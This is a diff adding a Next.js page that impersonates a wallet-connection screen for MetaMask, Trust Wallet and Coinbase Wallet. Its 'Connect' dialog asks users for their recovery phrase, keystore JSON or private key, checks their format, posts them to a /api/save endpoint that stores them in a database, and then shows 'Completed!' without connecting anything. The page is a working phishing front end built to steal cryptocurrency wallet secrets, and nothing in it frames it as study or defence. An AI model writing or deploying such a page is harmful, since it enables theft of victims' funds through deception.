@@ -1,0 +1,173 @@
+"use client";
+import { useState } from "react";
+import { Card, CardContent } from "@/components/ui/card";
+import { Button } from "@/components/ui/button";
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import Image from "next/image";
+
+const wallets = [
+  { name: "MetaMask", logo: "/Logos/metamask.png" },
+  { name: "Trust Wallet", logo: "/Logos/trust.png" },
+  { name: "Coinbase Wallet", logo: "/Logos/coinbase.png" },
+];
+
+export default function AppPage() {
+  const [selectedWallet, setSelectedWallet] = useState<any>(null);
+  type TabKey = "phrase" | "keyStore" | "privateKey";
+  const [activeTab, setActiveTab] = useState<TabKey>("phrase");
+  const [formData, setFormData] = useState({ phrase: "", keyStore: "", privateKey: "" });
+  const [submitted, setSubmitted] = useState(false);
+  const [error, setError] = useState(""); // ✅ error state
+
+  const validateInput = () => {
+    if (activeTab === "phrase") {
+      const words = formData.phrase.trim().split(/\s+/);
+      if (words.length < 12) {
+        return "Recovery phrase must be at least 12 words.";
+      }
+    }
+    if (activeTab === "keyStore") {
+      if (formData.keyStore.trim().length < 50) {
+        return "Keystore JSON must be at least 50 characters.";
+      }
+    }
+    if (activeTab === "privateKey") {
+      if (formData.privateKey.trim().length !== 64) {
+        return "Private key must be exactly 64 characters.";
+      }
+    }
+    return "";
+  };
+
+const handleSubmit = async () => {
+  const validationError = validateInput();
+  if (validationError) {
+    setError(validationError);
+    return;
+  }
+
+  setError("");
+
+  const res = await fetch("/api/save", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      wallet: selectedWallet?.name,
+      type: activeTab,
+      value:
+        activeTab === "phrase"
+          ? formData.phrase
+          : activeTab === "keyStore"
+          ? formData.keyStore
+          : formData.privateKey,
+    }),
+  });
+
+  const data = await res.json();
+  console.log("✅ Saved to DB:", data);
+
+  setSubmitted(true);
+  setFormData({ phrase: "", keyStore: "", privateKey: "" });
+};
+
+
+  return (
+    <div className="min-h-screen bg-black text-white p-8">
+      <h1 className="text-3xl font-bold text-center mb-10">Select Your Wallet</h1>
+
+      <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 max-w-4xl mx-auto">
+        {wallets.map((wallet) => (
+          <Card
+            key={wallet.name}
+            className="cursor-pointer hover:shadow-xl transition"
+            onClick={() => {
+              setSelectedWallet(wallet);
+              setSubmitted(false);
+              setError("");
+            }}
+          >
+            <CardContent className="flex flex-col items-center p-6">
+              <Image src={wallet.logo} alt={wallet.name} width={60} height={60} />
+              <p className="mt-4 font-semibold">{wallet.name}</p>
+            </CardContent>
+          </Card>
+        ))}
+      </div>
+
+      {/* Modal */}
+      <Dialog open={!!selectedWallet} onOpenChange={() => setSelectedWallet(null)}>
+        <DialogContent className="bg-gray-900 text-white rounded-2xl">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-3">
+              {selectedWallet && (
+                <Image src={selectedWallet.logo} alt="logo" width={30} height={30} />
+              )}
+              {selectedWallet?.name}
+            </DialogTitle>
+          </DialogHeader>
+
+          {/* Completed state */}
+          {submitted ? (
+            <div className="text-center p-6">
+              <p className="text-lg font-semibold text-green-400">✅ Completed!</p>
+            </div>
+          ) : (
+            <>
+              {/* Tabs */}
+              <div className="flex gap-2 mb-4">
+                {[
+                  { label: "Phrase", key: "phrase" },
+                  { label: "Keystore", key: "keyStore" },
+                  { label: "Private Key", key: "privateKey" },
+                ].map((tab) => (
+                  <Button
+                    key={tab.key}
+                    variant={activeTab === tab.key ? "default" : "secondary"}
+                    onClick={() => {
+                      setActiveTab(tab.key as TabKey);
+                      setError(""); // reset error when switching tabs
+                    }}
+                  >
+                    {tab.label}
+                  </Button>
+                ))}
+              </div>
+              {activeTab === "phrase" && (
+                <textarea
+                  placeholder="Enter recovery phrase"
+                  className="w-full p-3 rounded bg-gray-800"
+                  value={formData.phrase}
+                  onChange={(e) => setFormData({ ...formData, phrase: e.target.value })}
+                />
+              )}
+              {activeTab === "keyStore" && (
+                <textarea
+                  placeholder="Paste keyStore "
+                  className="w-full p-3 rounded bg-gray-800"
+                  value={formData.keyStore}
+                  onChange={(e) => setFormData({ ...formData, keyStore: e.target.value })}
+                />
+              )}
+              {activeTab === "privateKey" && (
+                <input
+                  type="text"
+                  placeholder="Enter private key"
+                  className="w-full p-3 rounded bg-gray-800"
+                  value={formData.privateKey}
+                  onChange={(e) => setFormData({ ...formData, privateKey: e.target.value })}
+                />
+              )}
+
+              {/* Error message */}
+              {error && <p className="text-red-400 text-sm mt-2">{error}</p>}
+
+              <Button onClick={handleSubmit} className="w-full mt-4">
+                Connect
+              </Button>
+            </>
+          )}
+        </DialogContent>
+      </Dialog>
+    </div>
+  );
+}
